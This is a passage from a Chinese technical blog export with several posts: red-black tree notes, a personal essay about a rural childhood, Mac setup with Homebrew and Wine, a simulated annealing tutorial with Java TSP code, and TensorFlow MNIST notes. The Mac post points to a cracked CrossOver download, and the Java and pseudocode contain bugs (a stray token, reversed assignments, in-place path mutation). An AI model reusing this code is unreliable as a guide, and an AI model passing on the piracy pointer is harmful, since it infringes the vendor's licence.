<p>应该注意到，2-3-4树是不允许有5节点的。因此，翻开算法导论，<code>情况1：叔节点是红色的</code>就可以看作，发现了不可能存在的5节点，就立马变色。因为胖胖树最终是要拆成3个瘦树的，所以对连续红色节点的树进行旋转，形成胖胖的标准形状。</p>
<h4 id="3-左倾红黑树"><a href="#3-左倾红黑树" class="headerlink" title="3. 左倾红黑树"></a>3. 左倾红黑树</h4><p><a href="https://www.jianshu.com/p/37c845a5add6">这篇文章（插入部分有错误，详情见我给他的评论）</a>里介绍了<code>左倾红黑树</code>。不同于算法导论中介绍的版本，左倾红黑树是由2-3树的变种，又因为作者给了很牛逼的递归表达，因此实现起来更简单。</p>
<ol>
<li>插入红节点，如果如果右倾，左旋为左倾</li>
<li>如果出现连续的红节点，右旋转换成胖胖节点</li>
<li>出现了胖胖节点，立刻分解成3个瘦节点（变色）</li>
</ol>
<p>下面是作者给出的RB-tree和LLRB-tree的代码差别：</p>
<p><img src="http://qiniu.s1nh.org/algorithm-23-234.png-QNthin"></p>
]]></content>
      <categories>
        <category>工作笔记</category>
      </categories>
  </entry>
  <entry>
    <title>雨季</title>
    <url>/post/Rainy_Season/</url>
    <content><![CDATA[<p>连日的大雨像是来到了热带雨林的雨季，匆匆的来，又匆匆地去。</p>
<span id="more"></span>

<p>在小小的欢欣中等待着啊，远处的岱山，在雨里映出朦胧的幻影。我仿佛看到那边山头的老农捶打着他佝偻的脊背，似乎是正捶打着他的命运。</p>
<p>我坐在窗台上，去接窗外的雨水，它流走了，流走了……</p>
<p>原来是雨季啊。</p>
<p>外婆安静地坐在黄桷树下，一副慈祥的模样，手里是那她已摸了十几年的针线，缝补着为我们遮挡日晒和雨淋的旧衣裳。外公在田里耕作着他的一生，除了偶尔抬头，冲着低头缝衣服的外婆和望着天空妄想的我笑笑以外，他都把他的正脸奉献给了田地。似乎那双长满茧的手正紧紧握住他生命的力量，在午后日光的锤炼里，显得格外耀眼。而我呢，哼着村里小孩儿们都爱唱的不知名的小曲儿，在阳光的宽容下，贪婪地坐在外婆的身旁。</p>
<p>“呜呜呜……”风风脸上又挂着那熟悉的泪珠，从不远处向我跑来。</p>
<p>“又怎么了？”外婆微微笑着，关切地问。</p>
<p>风风倒是懂得卖乖，一屁股坐在我和外婆中间，把我挤到一旁，挽着外婆的胳膊就开始滔滔不绝地诉苦。学校邻座的阿黄又不借他铅笔啦，隔壁村的李四儿又把他的玩具枪拿去啦，对面山头的小红又不搭理他啦……什么破事儿都能让他给哭上个半天。</p>
<p>风风和我一样，爹娘都去城里打工了。不过他更可怜，家里人都走得早，只剩下和他相依为命的姨娘还固守在这片苍老的红土地上。平时他姨娘又得忙着种田，索性他就常常跑到我家来蹭热闹。</p>
<p>那时候，村里邻着的几户人家到傍晚时分，都会凑成一个大圆桌，各家都高兴地把各自准备的晚饭摆上桌，再热情地招呼着大家伙“别客气，尽量吃”。风风老爱挤在我和外婆中间，要是我不肯，他便要哭鼻子。我又是村里较大的孩子，每次总得让着他，尽管我心里十分不乐意。</p>
<p>吃过晚饭，天色有些暗，我就常和风风一起跑到村口附近的那个风口去，风口就处在两个隐蔽小山包凸出部分的中间，我俩爱在那儿做些“非法事件”。小孩儿天生对火有种莫名的好奇感，总想学着大人做饭一样找些木材来生火，再找些破铜烂铁和烂菜叶子，来学着家里的女人那般掌控全家人的口粮。风风负责去找木材和菜叶子，我负责在原地生火，风口的风不大不小刚好，火烧得很旺。那一簇簇跳动的火焰所发出的光芒啊，照射在稚嫩的脸颊上，像温暖的拥抱和亲吻，每当此刻我心里都会燃起一股莫名的冲动，想要奔跑起来，与那从不肯顺从的风一比高下。一切都在燃烧着，木材，空气，风风的眼神，我的胸腔，还有年华。火焰之上，支撑起全家人赖以生存的粮食。</p>
<p>“诶，这，这是什么味儿啊……“风风突然皱起了眉头，疑惑地对我说，”像是什么干草烧起来了的味道？“</p>
<p>我从自己的幻想里被拉回了现实，大梦初醒般不知所措地望向四周，猛然间发现，旁边的稻谷堆已燃起大火。风越来越烈。我和风风吓坏了，忙跑到村里求救。村里人都急急忙忙地拿着水桶去村里唯一的井中打水，再慌慌张张地跑到风口用水灭火。</p>
<p>最终，”哗啦哗啦“，始料不及的一场大雨，熄灭了火焰，熄灭了幻想的火焰。</p>
<p>我和风风被骂得很惨。</p>
<p>几个月后，爹娘来接我了，我知道这是迟早的事情。他们在城里打工了好几年，他们赚了些钱，他们说城里有更好的物质和教育，他们准备带我去城里读书和生活。</p>
<p>站在绿色水田的边缘，身后是一辆我不知道名字的小轿车，车里坐着我的父亲。我娘牵着我的手，我也只是任她着，另一只手无处安放，眼睛呆呆地看着外公。</p>
<p>外公没说话。也许是正午的太阳太过于残酷，让他始终抬不起头，表情凝重而深沉地望着土地。我想，可能是害怕天太大，又太陡，他浑浊的目光无处停靠，害怕天把过多的心事透露，他无法判断更不能担当。所以他宁愿把那不染污泥的眼神献给他耕作了大半辈子的沉默的土地。</p>
<p>我记得那天，泪眼婆娑的外婆带着风风来送我，平时爱哭的风风今天眼角却干干净净的，再没有了那几条脏脏的泪痕，他对我说他写了一首诗，我站在熟悉的风口，高兴地让他念给我听，我要是走了，就再也听不到了。</p>
<p>风风于是站得笔挺，一本正经地给我念起他写的诗：妈了个巴子妈了个巴子妈了个巴子……</p>
<p>风风朗读完毕，从背后慢慢抽出一把枪来，向我瞄准，他的身后是蓝得刺眼的辽阔天空，脚下是一片蜂飞蝶舞的五颜六色的花丛。</p>
<p>我闭上眼睛，勇敢地迎向他的枪口，我没有绝望，也没有躲藏，我发现自己一直都在等待这一刻的来临，但愿他的子弹能穿透我的胸膛，但愿我的胸膛能流出真实鲜红的血液。</p>
<p>枪响了，我醒来，在充满泥土气息的夜里，我急促地大口呼吸着2014年的空气，喉咙难受地哽咽着，却一直流不出泪来。</p>
<p>我听见窗外哗啦啦的雨声，一滴一滴击中我的心头，我的心脏开始隐隐作痛，就在雨水一点，一点，淌出心房时，我知道，雨季不会再来了，我长大了。</p>
]]></content>
      <categories>
        <category>工作笔记</category>
      </categories>
  </entry>
  <entry>
    <title>Mac OS X 安装后的简单设置</title>
    <url>/post/SettingUpNewMac/</url>
    <content><![CDATA[<p>本文为<code>2014-11-24 20:40</code>的旧版本，<a href="/post/set-up-a-new-computer/"><strong>新版本</strong></a></p>
<h2 id="让Mac拥有类似apt-get的功能——安装Homebrew"><a href="#让Mac拥有类似apt-get的功能——安装Homebrew" class="headerlink" title="让Mac拥有类似apt-get的功能——安装Homebrew"></a>让Mac拥有类似apt-get的功能——安装Homebrew</h2><p>Homebrew是一个包管理器，用于在Mac上安装一些OS X没有的UNIX工具（比如著名的wget）。</p>
<p>官方网站：<code>http://brew.sh/</code></p>
<span id="more"></span>

<p>####安装</p>
<pre><code>打开Terminal，执行以下语句：
ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)“
</code></pre>
<h4 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h4><p>Homebrew安装成功后，会自动创建目录 <code>/usr/local/Cellar</code> 来存放Homebrew安装的程序。 这是你在命令行状态下面就可以使用 brew 命令了.<br>通过 <code>brew install</code>就可以安装软件了,通过 <code>brew search</code> 就可以搜索程序，例如 <code>brew search vim</code> ,就可以搜索名称包括vim的程序,</p>
<p>通过 <code>brew update</code> 就可以把包信息更新到最新，不过包更新是通过git命令，所以要先通过 <code>brew install git</code> 命令安装git。</p>
<p>####其他命令</p>
<pre><code>brew –help      —查看brew的帮助
    
brew install    —git安装软件

brew uninstall  —git卸载软件

brew search     —git搜索软件

brew list       —显示已经安装软件列表

brew update     —更新软件，把所有的Formula目录更新，并且会对本机已经安装并有更新的软件用*标明。

brew upgrade git    —更新某具体软件

brew [info | home] [FORMULA...] —查看软件信息

brew cleanup git 
brew cleanup        —删除程序，和upgrade一样，单个软件删除和所有程序老版删除。

brew outdated       —查看那些已安装的程序需要更新

brew deps * — 显示包依赖

brew server *  —启动web服务器，可以通过浏览器访问http://localhost:4567/ 来同网页来管理包
</code></pre>
<hr>
<p>##在Mac下运行Windows程序</p>
<p>Wine使得Linux,Max,FreeBSD和Solaris用户在没有微软Windows的副本的情况下运行Windows应用程序。</p>
<p>####<strong>CrosssOver —— 一个Wine的商业版（推荐）</strong></p>
<p>Crossover是Codewave公司制作的wine的一个商业版本，比Wine要易用的多。GUI比wine人性化，也有中文支持，安装的软件会在lauchpad显示。</p>
<pre><code>Crossover可以从官方网站 `https://www.codeweavers.com/`购买；

破解版可以去 `http://bbs.feng.com/forum.php?mod=viewthread&amp;tid=8655918` 下载，目前最新版为14.0.3

一个CrossOver 的介绍贴 `http://bbs.feng.com/read-htm-tid-6817722.html`
</code></pre>
<p>####如果你不愿付费购买商业版或者不想使用破解版本，你可以使用开源的Wine</p>
<p>你可以通过Homebrew安装Wine，非常简单，输入以下命令即可。</p>
<pre><code>brew install wine --devel
命令中的--devel参数表示安装开发版，否则默认安装稳定版。Wine的开发版本也足够稳定，不必担心，而其兼容性会高于稳定版。
</code></pre>
<p>还可以安装WineBottler</p>
<pre><code>WineBottler是一个Wine的封装，不需要安装X11，直接下载后复制到Application目录即可。
WineBottler官方网站
http://winebottler.kronenberg.org/
</code></pre>
<p>这篇文章是从之前的博客转移过来的，实际创建日期为: <code>2014-11-24 20:40</code></p>
<hr>
<pre><code>参考文献    
［1］http://blog.csdn.net/maojudong/article/details/7918291
［2］http://bbs.feng.com/read-htm-tid-6817722.html
</code></pre>
]]></content>
      <categories>
        <category>工作笔记</category>
      </categories>
  </entry>
  <entry>
    <title>模拟退火算法</title>
    <url>/post/SimulatedAnnealing/</url>
    <content><![CDATA[<blockquote>
<p>本文为整理的介绍爬山算法、模拟退火算法的资料。部分来源网络。</p>
</blockquote>
<h2 id="爬山算法-Hill-Climbing"><a href="#爬山算法-Hill-Climbing" class="headerlink" title="爬山算法(Hill Climbing)"></a>爬山算法(Hill Climbing)</h2><p>介绍模拟退火前，先介绍爬山算法。爬山算法是一种简单的贪心搜索算法，该算法每次从当前解的临近解空间中选择一个最优解作为当前解，直到达到一个局部最优解。</p>
<p><img src="http://qiniu.s1nh.org/Blog_HillClimbing_1.png-QNthin"></p>
<span id="more"></span>

<p>爬山算法实现很简单，其主要缺点是会陷入局部最优解，而不一定能搜索到全局最优解。如图1所示：假设C点为当前解，爬山算法搜索到A点这个局部最优解就会停止搜索，因为在A点无论向那个方向小幅度移动都不能得到更优的解。</p>
<h2 id="模拟退火-SA-Simulated-Annealing-思想"><a href="#模拟退火-SA-Simulated-Annealing-思想" class="headerlink" title="模拟退火(SA,Simulated Annealing)思想"></a>模拟退火(SA,Simulated Annealing)思想</h2><p>爬山法是完完全全的贪心法，每次都鼠目寸光的选择一个当前最优解，因此只能搜索到局部的最优值。模拟退火其实也是一种贪心算法，但是它的搜索过程引入了随机因素。模拟退火算法以一定的概率来接受一个比当前解要差的解，因此有可能会跳出这个局部的最优解，达到全局的最优解。以图1为例，模拟退火算法在搜索到局部最优解A后，会以一定的概率接受到E的移动。也许经过几次这样的不是局部最优的移动后会到达D点，于是就跳出了局部最大值A。</p>
<pre><code>模拟退火算法描述：

若J(Y(i+1))&gt;=J(Y(i)) (即移动后得到更优解)，则总是接受该移动

若J(Y(i+1))&lt;J(Y(i)) (即移动后的解比当前解要差) ，则以一定的概率接受移动，而且这个概率随着时间推移逐渐降低（逐渐降低才能趋向稳定）
</code></pre>
<p>这里的“一定的概率”的计算参考了金属冶炼的退火过程，这也是模拟退火算法名称的由来。</p>
<p>根据热力学的原理，在温度为T时，出现能量差为dE的降温的概率为P(dE)，表示为：</p>
<p><code>P(dE)=exp(dE/(kT))</code></p>
<p>其中k是一个常数，exp表示自然指数，且dE&lt;0。这条公式说白了就是：温度越高，出现一次能量差为dE的降温的概率就越大；温度越低，则出现降温的概率就越小。又由于dE总是小于0（否则就不叫退火了），因此<code>dE/kT&lt;0</code>，所以P(dE)的函数取值范围是(0,1)。</p>
<p>随着温度T的降低，P(dE)会逐渐降低。</p>
<p>我们将一次向较差解的移动看做一次温度跳变过程，我们以概率P(dE)来接受这样的移动。</p>
<pre><code>关于爬山算法与模拟退火，有一个有趣的比喻：

爬山算法：兔子朝着比现在高的地方跳去。它找到了不远处的最高山峰。但是这座山不一定是珠穆朗玛峰。这就是爬山算法，它不能保证局部最优值就是全局最优值。

模拟退火：兔子喝醉了。它随机地跳了很长时间。这期间，它可能走向高处，也可能踏入平地。但是，它渐渐清醒了并朝最高方向跳去。这就是模拟退火。
</code></pre>
<h2 id="模拟退火算法伪代码"><a href="#模拟退火算法伪代码" class="headerlink" title="模拟退火算法伪代码"></a>模拟退火算法伪代码</h2><pre><code>/*
* J(y)：在状态y时的评价函数值
* Y(i)：表示当前状态
* Y(i+1)：表示新的状态
* r： 用于控制降温的快慢
* T： 系统的温度，系统初始应该要处于一个高温的状态
* T_min ：温度的下限，若温度T达到T_min，则停止搜索
*/
while( T &gt; T_min )
&#123;
　　dE = J( Y(i+1) ) - J( Y(i) ) ; 

　　if ( dE &gt;=0 ) //表达移动后得到更优解，则总是接受移动
Y(i+1) = Y(i) ; //接受从Y(i)到Y(i+1)的移动
　　else
　　&#123;
// 函数exp( dE/T )的取值范围是(0,1) ，dE/T越大，则exp( dE/T )也
if ( exp( dE/T ) &gt; random( 0 , 1 ) )
Y(i+1) = Y(i) ; //接受从Y(i)到Y(i+1)的移动
　　&#125;
　　T = r * T ; //降温退火 ，0&lt;r&lt;1 。r越大，降温越慢；r越小，降温越快
　　/*
　　* 若r过大，则搜索到全局最优解的可能会较高，但搜索的过程也就较长。若r过小，则搜索的过程会很快，但最终可能会达到一个局部最优值
　　*/
　　i ++ ;
&#125;
</code></pre>
<h2 id="使用模拟退火算法解决旅行商问题"><a href="#使用模拟退火算法解决旅行商问题" class="headerlink" title="使用模拟退火算法解决旅行商问题"></a>使用模拟退火算法解决旅行商问题</h2><p>旅行商问题(TSP, Traveling Salesman Problem)：有N个城市，要求从其中某个问题出发，唯一遍历所有城市，再回到出发的城市，求最短的路线。</p>
<p>旅行商问题属于所谓的NP完全问题，精确的解决TSP只能通过穷举所有的路径组合，其时间复杂度是O(N!)。</p>
<p>使用模拟退火算法可以比较快的求出TSP的一条近似最优路径。（使用遗传算法也是可以的，我将在下一篇文章中介绍）模拟退火解决TSP的思路：</p>
<pre><code>1. 产生一条新的遍历路径P(i+1)，计算路径P(i+1)的长度L(P(i+1))

2. 若L(P(i+1))&lt;L(P(i))，则接受P(i+1)为新的路径，否则以模拟退火的那个概率接受P(i+1)，然后降温

3. 重复步骤1，2直到满足退出条件
</code></pre>
<p>产生新的遍历路径的方法有很多，下面列举其中3种：</p>
<pre><code>1. 随机选择2个节点，交换路径中的这2个节点的顺序。

2. 随机选择2个节点，将路径中这2个节点间的节点顺序逆转。

3. 随机选择3个节点m，n，k，然后将节点m与n间的节点移位到节点k后面。
</code></pre>
<p>代码</p>
<pre><code>package com.test1;

import java.lang.reflect.Array;
import java.util.*;

public class SimulatedAnnealing &#123;

    public static void main(String[] args) &#123;
        SA sa=new SA();
        int[][] test=sa.getData();
        int[][] test2=sa.getMatrix(6);
        sa.sa(test2, 2);
    &#125;
&#125;
class SA&#123;
    //随机获取一个矩阵数据表示个城市之间的距离
    public int[][] getMatrix(int cityNum)&#123;
        Random random=new Random();
        int[][] matrix=new int[cityNum][cityNum];
        for(int i=0;i&lt;cityNum;i++)&#123;
            matrix[i][i]=999;
        &#125;
        for(int i=0;i&lt;cityNum;i++)&#123;
            for(int j=i+1;j&lt;cityNum;j++)&#123;
                matrix[i][j]=random.nextInt(100);
                matrix[j][i]=matrix[i][j];
            &#125; 
        &#125;
        return matrix;
    &#125;
    //随时选择两个城市交换位置，生成新的路径
    public List getNewPath(List path)&#123;
        Random random=new Random();
        int size=path.size();
        if(size&lt;2)&#123;
            System.out.println(&quot;城市数目太少，无法生成新的路径&quot;);
            return path;
        &#125;
        int position1;
        int position2;
        do&#123;
            position1=random.nextInt(size-1);
            position2=random.nextInt(size-1);
        &#125;while(position1==0 || position2==0 || position1==position2);
        
        Integer temp=(Integer)path.get(position1);he xo
        path.set(position1,(Integer)path.get(position2));
        path.set(position2,temp);
        
        return path;
    &#125;
    //计算接受的概率
    public double acceptanceProbability(int length,int newLength,double temperature)&#123;
        if(newLength &lt; length)&#123;
            return 1.1;
        &#125;
        return Math.exp((length-newLength)/temperature);
    &#125;
    //模拟退火过程，得到最优方案
    public List sa(int[][] matrix,int start)&#123;
        //record the number of cycles
        int num=1;
        //初始化温度
        double temperature=1000;
        //冷却概率
        double coolingRate=0.997;
        //初始化解决方案
        //List firstPath=greedy(matrix,1);
        List firstPath=getFirstPath(matrix.length,start);
        List bestPath=firstPath;
        System.out.print(&quot;第0次： path:&quot;);
        printPath(bestPath);
        System.out.print(&quot; length:&quot;+getLength(matrix, bestPath)+&quot;\n&quot;);
        //循环直至系统冷却
        while(temperature&gt;1)&#123;
            //get current path&#39;s length
            int length=getLength(matrix, bestPath);
            //create a new path
            List newPath=getNewPath(bestPath);
            //get newPath&#39;s length
            int newLength=getLength(matrix, newPath);
            //decition
            double acceptanceProbability=acceptanceProbability(length, newLength, temperature);
            if(acceptanceProbability&gt;Math.random())&#123;
                //acceptance
                bestPath=newPath;
                System.out.print(&quot;第&quot;+num+&quot;次： path:&quot;);
                printPath(bestPath);
                System.out.print(&quot; length:&quot;+getLength(matrix, bestPath)+&quot;\n&quot;);
                num++;
            &#125;else&#123;
                //give up the new path
            &#125;
            //cooling 
            temperature*=coolingRate;
        &#125;
        return bestPath;
    &#125;
    //使用贪心算法获得一个初始的遍历序列
    public List greedy(int[][] matrix,int start)&#123;
        int line=matrix.length;
        if(start&gt;(line-1))&#123;
            System.out.println(&quot;输入数据有误！&quot;);
            return null;
        &#125;
        List&lt;Integer&gt; already=new ArrayList&lt;Integer&gt;();
        int point_now=start;
        already.add(start);
        for(int i=0;i&lt;(line-1);i++)&#123;
            int min=999;
            int next_point=0;
            for(int j=0;j&lt;line;j++)&#123;
                if(!already.contains(j) &amp;&amp; j!=point_now &amp;&amp; matrix[point_now][j]&lt;min)&#123;
                    min=matrix[point_now][j];
                    next_point=j;
                &#125;
            &#125;
            already.add(next_point);
            point_now=next_point;
        &#125;
        already.add(start);
        return already;
    &#125;
    //init the first path
    public List getFirstPath(int cityNum,int start)&#123;
        List path=new ArrayList();
        path.add(start);
        for(int i=1;i&lt;cityNum;i++)&#123;
            if(i!=start)
                path.add(i);
        &#125;
        path.add(start);
        return path;
    &#125;
    //计算一个路径的总长度
    public int getLength(int[][] matrix,List path)&#123;
        int path_length=0;
        for(int i=0;i&lt;path.size()-1;i++)&#123;
            path_length+=matrix[(Integer)path.get(i+1)][(Integer)path.get(i)];
        &#125;
        return path_length;
    &#125;
    //得到一个测试数据
    public static int[][] getData()&#123;
        int[][] data=new int[5][5];
        data[0]=new int[]&#123;999,48,49,90,42&#125;;
        data[1]=new int[]&#123;48,999,24,22,49&#125;;
        data[2]=new int[]&#123;49,24,999,65,65&#125;;
        data[3]=new int[]&#123;90,22,65,999,92&#125;;
        data[4]=new int[]&#123;42,49,65,92,999&#125;;
        return data;
    &#125;
    //print a path
    public void printPath(List path)&#123;
        for(int i=0;i&lt;path.size();i++)&#123;
            System.out.print(path.get(i)+&quot; &quot;);
        &#125;
    &#125;
&#125;
</code></pre>
<h2 id="算法评价"><a href="#算法评价" class="headerlink" title="算法评价"></a>算法评价</h2><p>模拟退火算法是一种随机算法，并不一定能找到全局的最优解，可以比较快的找到问题的近似最优解。如果参数设置得当，模拟退火算法搜索效率比穷举法要高。</p>
<hr>
<p>参考文献：</p>
<ol>
<li><p><a href="http://www.cnblogs.com/heaad/archive/2010/12/20/1911614.html">大白话解析模拟退火算法</a></p>
</li>
<li><p><a href="http://www.cnblogs.com/heaad/archive/2010/12/23/1914725.html">http://www.cnblogs.com/heaad/archive/2010/12/23/1914725.html</a></p>
</li>
</ol>
]]></content>
      <categories>
        <category>工作笔记</category>
      </categories>
      <tags>
        <tag>爬山算法</tag>
        <tag>模拟退火算法</tag>
      </tags>
  </entry>
  <entry>
    <title>Softmax, MLP, CNN 三种方法识别手写数字MNIST——《TensorFlow 实战》读书笔记</title>
    <url>/post/Tensorflow-MNIST/</url>
    <content><![CDATA[<p><code>不要代码写多了就变得那么没有人情味了</code></p>
<h2 id="0x00-Intro"><a href="#0x00-Intro" class="headerlink" title="0x00 Intro"></a>0x00 Intro</h2><h3 id="1-读入MNIST数据库"><a href="#1-读入MNIST数据库" class="headerlink" title="1. 读入MNIST数据库"></a>1. 读入MNIST数据库</h3><p>执行<code>mnist = input_data.read_data_sets(&quot;MNIST_data/&quot;, one_hot=True)</code>后，会检查<code>MNIST_data/</code>文件夹下有没有数据库文件，如果没有会自动下载。这一步如果执行比较慢，可以用迅雷手动下载下面四个文件，保存到MNIST_data目录（不需要解压）</p>
<ul>
<li><a href="http://yann.lecun.com/exdb/mnist/train-images-idx3-ubyte.gz">train-images-idx3-ubyte.gz</a>:  training set images (9912422 bytes)</li>
<li><a href="http://yann.lecun.com/exdb/mnist/train-labels-idx1-ubyte.gz">train-labels-idx1-ubyte.gz</a>:  training set labels (28881 bytes)</li>
<li><a href="http://yann.lecun.com/exdb/mnist/t10k-images-idx3-ubyte.gz">t10k-images-idx3-ubyte.gz</a>:   test set images (1648877 bytes)</li>
<li><a href="http://yann.lecun.com/exdb/mnist/t10k-labels-idx1-ubyte.gz">t10k-labels-idx1-ubyte.gz</a>:   test set labels (4542 bytes) </li>
</ul>
<span id="more"></span>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tensorflow.examples.tutorials.mnist <span class="keyword">import</span> input_data</span><br><span class="line">mnist = input_data.read_data_sets(<span class="string">&quot;MNIST_data/&quot;</span>, one_hot=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<pre><code>Extracting MNIST_data/train-images-idx3-ubyte.gz
Extracting MNIST_data/train-labels-idx1-ubyte.gz
Extracting MNIST_data/t10k-images-idx3-ubyte.gz
Extracting MNIST_data/t10k-labels-idx1-ubyte.gz
</code></pre>
<h3 id="2-初始化-Tensorflow"><a href="#2-初始化-Tensorflow" class="headerlink" title="2. 初始化 Tensorflow"></a>2. 初始化 Tensorflow</h3><p>Tensorflow 运行时默认会把GPU显存一次性占满，添加<code>config.gpu_options.allow_growth = True</code> 使其可以动态分配显存</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line">config = tf.ConfigProto()</span><br><span class="line">config.gpu_options.allow_growth = <span class="literal">True</span></span><br><span class="line">sess = tf.InteractiveSession(config = config)</span><br></pre></td></tr></table></figure>

<h2 id="0x01-Softmax"><a href="#0x01-Softmax" class="headerlink" title="0x01 Softmax"></a>0x01 Softmax</h2><p>只用 Softmax Regression 进行分类，正确率约为92%</p>
<h3 id="1-定义变量"><a href="#1-定义变量" class="headerlink" title="1. 定义变量"></a>1. 定义变量</h3><p>Softmax Regression 的公式可以写成：</p>
<p>$$y=softmax(Wx+b)$$</p>
<p>其中，<code>x</code>为输入数据（手写数字图片），不限条数的<code>784</code>维的<code>Float32</code>型数据；<br><code>W</code>为<code>784×10（特征维数×图片种类）</code>的<code>Variable</code>向量；<br><code>b</code>是bias（偏置）<br><code>y</code>为Softmax分类后得出的结果</p>
<p>loss function为<code>cross_entropy</code>，定义如下：</p>
<p>$$H_y’(y)=-\sum_{i}{y’_ilog(y_i)}$$</p>
<p>而<code>reduce_mean</code>为对每个batch求均值（reduction_indices=[1]的意思请看后面的附录， 在新版的<a href="https://www.tensorflow.org/get_started/mnist/beginners">Tensorflow tutorial</a>中，这部分稍有区别<br>）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = tf.placeholder(tf.float32,[<span class="literal">None</span>,<span class="number">784</span>])</span><br><span class="line">W = tf.Variable(tf.zeros([<span class="number">784</span>,<span class="number">10</span>]))</span><br><span class="line">b = tf.Variable(tf.zeros([<span class="number">10</span>]))</span><br><span class="line"></span><br><span class="line">y = tf.nn.softmax(tf.matmul(x,W) + b)</span><br><span class="line">y_ = tf.placeholder(tf.float32,[<span class="literal">None</span>,<span class="number">10</span>])</span><br><span class="line"></span><br><span class="line">cross_entropy = tf.reduce_mean(-tf.reduce_sum(y_ * tf.log(y),reduction_indices=[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">train_step = tf.train.GradientDescentOptimizer(<span class="number">0.5</span>).minimize(cross_entropy)</span><br></pre></td></tr></table></figure>

<h3 id="2-训练"><a href="#2-训练" class="headerlink" title="2. 训练"></a>2. 训练</h3><p>每次训练抽取100个样本作为<code>mini-batch</code>，并传给<code>placeholder(x,y_)</code>进行训练，并每隔250输出一次权重。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tf.global_variables_initializer().run()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    batch_xs, batch_ys = mnist.train.next_batch(<span class="number">100</span>)</span><br><span class="line">    sess.run(train_step, feed_dict=&#123;x: batch_xs, y_: batch_ys&#125;)</span><br><span class="line">    <span class="keyword">if</span> (i-<span class="number">1</span>)%<span class="number">250</span> == <span class="number">0</span>:</span><br><span class="line">        fig2,ax2 = plt.subplots(nrows=<span class="number">1</span>, ncols=<span class="number">10</span>, figsize=(<span class="number">20</span>,<span class="number">2</span>))</span><br><span class="line">        WW=np.transpose(sess.run(tf.reshape(W,[<span class="number">784</span>,<span class="number">10</span>])))</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">            ax2[i].imshow(np.reshape(WW[i]+np.ones(<span class="number">784</span>), (<span class="number">28</span>, <span class="number">28</span>)))</span><br><span class="line">        plt.show()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="http://qiniu.s1nh.org/Blog_Tensorflow_MNIST_0.png" alt="png"></p>
<p><img src="http://qiniu.s1nh.org/Blog_Tensorflow_MNIST_1.png" alt="png"></p>
<p><img src="http://qiniu.s1nh.org/Blog_Tensorflow_MNIST_2.png" alt="png"></p>
<p><img src="http://qiniu.s1nh.org/Blog_Tensorflow_MNIST_3.png" alt="png"></p>
<h3 id="3-计算正确率"><a href="#3-计算正确率" class="headerlink" title="3. 计算正确率"></a>3. 计算正确率</h3><p>accuracy 与 train_step 的区别官方给出了如下解释: “<em>Note: the Tensor class will be replaced by Output in the future. Currently these two are aliases for each other.</em>“</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">correct_prediction = tf.equal(tf.arg_max(y,<span class="number">1</span>),tf.arg_max(y_,<span class="number">1</span>))</span><br><span class="line">accuracy = tf.reduce_mean(tf.cast(correct_prediction,tf.float32))</span><br><span class="line"><span class="built_in">print</span>(sess.run(accuracy, feed_dict=&#123;x: mnist.test.images, y_: mnist.test.labels&#125;))</span><br><span class="line"></span><br><span class="line">summary_writer = tf.summary.FileWriter(<span class="string">&#x27;Softmax&#x27;</span>, sess.graph)</span><br></pre></td></tr></table></figure>

<pre><code>0.9163
</code></pre>
<h2 id="0x02-MLP"><a href="#0x02-MLP" class="headerlink" title="0x02 MLP"></a>0x02 MLP</h2><p>使用多层感知机（MLP）进行分类，准确率约为98%</p>
<h3 id="1-定义变量-1"><a href="#1-定义变量-1" class="headerlink" title="1. 定义变量"></a>1. 定义变量</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">in_units = <span class="number">784</span></span><br><span class="line">h1_units = <span class="number">300</span></span><br><span class="line">W1 = tf.Variable(tf.truncated_normal([in_units,h1_units],stddev=<span class="number">0.1</span>))</span><br><span class="line">b1 = tf.Variable(tf.zeros([h1_units]))</span><br><span class="line">W2 = tf.Variable(tf.zeros([h1_units, <span class="number">10</span>]))</span><br><span class="line">b2 = tf.Variable(tf.zeros([<span class="number">10</span>]))</span><br><span class="line"></span><br><span class="line">x = tf.placeholder(tf.float32,[<span class="literal">None</span>,in_units])</span><br><span class="line">keep_prob = tf.placeholder(tf.float32)</span><br><span class="line"></span><br><span class="line">hidden1 = tf.nn.relu(tf.matmul(x,W1)+b1)</span><br><span class="line">hidden1_drop = tf.nn.dropout(hidden1,keep_prob)</span><br><span class="line">y = tf.nn.softmax(tf.matmul(hidden1_drop,W2)+b2)</span><br><span class="line"></span><br><span class="line">y_ = tf.placeholder(tf.float32,[<span class="literal">None</span>,<span class="number">10</span>])</span><br><span class="line">cross_entropy = tf.reduce_mean(-tf.reduce_sum(y_ * tf.log(y),reduction_indices=[<span class="number">1</span>]))</span><br><span class="line">train_step = tf.train.GradientDescentOptimizer(<span class="number">0.3</span>).minimize(cross_entropy)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2-训练-1"><a href="#2-训练-1" class="headerlink" title="2. 训练"></a>2. 训练</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tf.global_variables_initializer().run()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5000</span>):</span><br><span class="line">    batch_xs, batch_ys = mnist.train.next_batch(<span class="number">100</span>)</span><br><span class="line">    train_step.run(&#123;x: batch_xs, y_: batch_ys, keep_prob: <span class="number">0.75</span>&#125;)</span><br></pre></td></tr></table></figure>

